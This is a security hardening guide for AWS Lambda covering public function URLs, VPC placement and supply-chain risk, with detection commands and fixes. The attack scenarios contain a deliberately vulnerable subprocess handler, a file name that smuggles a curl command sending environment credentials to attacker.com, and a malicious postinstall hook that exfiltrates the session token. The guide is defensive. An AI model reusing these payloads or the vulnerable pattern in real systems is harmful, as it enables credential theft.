# Lambda Function Hardening — URLs, VPC, and Supply Chain

## Attack Scenarios

### Scenario 1 — Public Lambda URL With No Auth
```bash
# Lambda URL created with AuthType NONE = anyone on the internet can invoke it
aws lambda create-function-url-config \
  --function-name my-api \
  --auth-type NONE   # No authentication — public endpoint

# Attacker discovers the URL (guessable format, leaked in logs, or JS bundle)
curl https://abc123def456.lambda-url.ap-south-1.on.aws/ \
  -d '{"action": "admin", "user_id": "attacker"}'
# Full invocation with no credentials
```

### Scenario 2 — Event Injection via S3 Trigger
```python
# Lambda triggered by S3 ObjectCreated events
# Processes filenames without sanitization

def handler(event, context):
    for record in event['Records']:
        key = record['s3']['object']['key']

        # Vulnerable: using key directly in a shell command
        import subprocess
        subprocess.run(f"process-file.sh {key}", shell=True)
        # Attacker uploads a file named: "file.txt; curl https://attacker.com -d $(env)"
        # Shell injection — exfiltrates all environment variables including AWS creds
```

### Scenario 3 — Supply Chain Attack via Dependencies
```bash
# package.json or requirements.txt has a dependency
# Attacker publishes a malicious version of the package (typosquatting or compromise)
# On next deploy, the malicious code runs inside Lambda with execution role credentials

# Example malicious postinstall in package.json:
# "postinstall": "node -e \"require('https').get('https://attacker.com/exfil?t='+process.env.AWS_SESSION_TOKEN)\""

# Attacker's package receives the Lambda's temporary credentials
# Uses them before TTL expires to enumerate and exfiltrate
```

### Scenario 4 — Lambda Not in VPC Reaches the Internet Freely
```bash
# Lambda outside a VPC has unrestricted internet access
# Compromised function can:
# - Call C2 (command and control) servers
# - Exfiltrate data to any external endpoint
# - Download additional malicious payloads
# No VPC flow logs = no visibility into this traffic
```

---

## Detection

```bash
# 1. Find Lambda functions with public URLs (AuthType NONE)
aws lambda list-functions \
  --query 'Functions[*].FunctionName' --output text | tr '\t' '\n' | \
  while read -r fn; do
    url_config=$(aws lambda get-function-url-config \
      --function-name "$fn" 2>/dev/null || echo "")
    if echo "$url_config" | grep -q '"AuthType": "NONE"'; then
      echo "CRITICAL: Lambda $fn has a public URL with no authentication"
    fi
  done

# 2. Find Lambda functions NOT attached to a VPC
aws lambda list-functions \
  --query 'Functions[?VpcConfig.VpcId==null || VpcConfig.VpcId==`""`].[FunctionName]' \
  --output table
# Functions here have unrestricted internet access

# 3. Find functions with very high concurrency (abuse indicator)
aws lambda list-functions \
  --query 'Functions[*].[FunctionName,Timeout,MemorySize]' --output table

aws lambda get-function-concurrency --function-name my-function

# 4. Check resource-based policies (who can invoke the function)
aws lambda get-policy --function-name my-function \
  --query 'Policy' --output text | python3 -m json.tool
# Look for Principal: * — means anyone can invoke

# 5. Detect anomalous invocation patterns via CloudWatch
aws cloudwatch get-metric-statistics \
  --namespace AWS/Lambda \
  --metric-name Invocations \
  --dimensions Name=FunctionName,Value=my-function \
  --start-time $(date -u -d '1 hour ago' +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ) \
  --period 300 \
  --statistics Sum \
  --output table
```

---

## Fix — Harden Lambda Configuration

```bash
# Fix 1: Enforce IAM auth on Lambda URLs
aws lambda create-function-url-config \
  --function-name my-api \
  --auth-type AWS_IAM   # Requires valid AWS credentials to invoke

# Or update existing
aws lambda update-function-url-config \
  --function-name my-api \
  --auth-type AWS_IAM

# Fix 2: Add a resource-based policy to restrict invocation
# Only allow API Gateway to invoke this function
aws lambda add-permission \
  --function-name my-function \
  --statement-id allow-apigw-only \
  --action lambda:InvokeFunction \
  --principal apigateway.amazonaws.com \
  --source-arn "arn:aws:execute-api:ap-south-1:123456789:api-id/*/POST/endpoint"

# Deny all other invocations
aws lambda add-permission \
  --function-name my-function \
  --statement-id deny-public \
  --action lambda:InvokeFunctionUrl \
  --principal "*" \
  --function-url-auth-type AWS_IAM

# Fix 3: Deploy function inside a VPC
aws lambda update-function-configuration \
  --function-name my-function \
  --vpc-config '{
    "SubnetIds": ["subnet-private-1a", "subnet-private-1b"],
    "SecurityGroupIds": ["sg-lambda-sg"]
  }'
# Function now has no internet access unless you add a NAT gateway
# All traffic visible in VPC flow logs

# Fix 4: Pin dependency versions and scan before deploy
# requirements.txt — pin to exact versions with hashes
cat > requirements.txt <<'EOF'
boto3==1.34.0 \
  --hash=sha256:abc123...
requests==2.31.0 \
  --hash=sha256:def456...
EOF

# Scan dependencies before packaging
pip install safety --break-system-packages
safety check -r requirements.txt

# Fix 5: Set reserved concurrency to limit blast radius
# If function is abused, attacker can't scale to thousands of invocations
aws lambda put-function-concurrency \
  --function-name my-function \
  --reserved-concurrent-executions 10

# Fix 6: Enable code signing to prevent unauthorized deployments
aws signer put-signing-profile \
  --profile-name MyLambdaSigningProfile \
  --signing-material CertificateArn=arn:aws:acm:...

aws lambda create-code-signing-config \
  --description "Require signed Lambda deployments" \
  --allowed-publishers SigningProfileVersionArns=arn:aws:signer:...:signing-profiles/MyLambdaSigningProfile/abcdef \
  --code-signing-policies UntrustedArtifactOnDeployment=Enforce
```

---

## Checklist

- [ ] No Lambda URLs with `AuthType: NONE`
- [ ] Resource-based policies scope invocation to specific services/roles
- [ ] Functions touching databases or internal services deployed inside a VPC
- [ ] Dependencies pinned to exact versions with integrity hashes
- [ ] `safety` or `pip-audit` scanning dependencies in CI before deploy
- [ ] Reserved concurrency set on all functions to limit runaway invocations
- [ ] Lambda code signing enforced in production accounts
- [ ] CloudWatch alarms on error rate spikes and unusual invocation counts
- [ ] Input validation on all event sources (S3 keys, API payloads, SQS messages)
